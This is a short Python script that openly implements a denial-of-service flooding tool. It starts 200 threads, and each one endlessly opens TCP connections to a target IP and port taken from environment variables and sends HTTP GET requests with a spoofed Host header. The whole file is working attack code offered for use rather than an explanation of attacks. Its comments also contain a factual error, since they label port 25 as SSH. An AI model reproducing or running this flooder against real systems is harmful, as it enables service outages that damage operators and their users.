import threading
import socket
import dotenv
import os

dotenv.load_dotenv()

########################################################################
# Port no represents a service -
# DDOS attack on a particular port means bringing that service down
# 25 - SSH | 80 - HTTP
########################################################################

target = os.environ.get("DDOS_TARGET_IP")
port = int(os.environ.get("DDOS_TARGET_PORT"))

# Fake IP does not means, you can conceal your identity
fake_ip = "182.21.29.21"

connection_counter = 0

total_attacks = 200

def attack():
    while True:
        # AF_INET - Internet based socket | SOCK_STREAM - TCP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        # Sending the get request after establishing the connection
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
        s.close()

        global connection_counter
        connection_counter +=1
        print(connection_counter)
print(f"Running a DDOS attack on {target}")
for i in range(total_attacks):
    thread = threading.Thread(target=attack)
    thread.start()
print("Finished the DDOS attack")


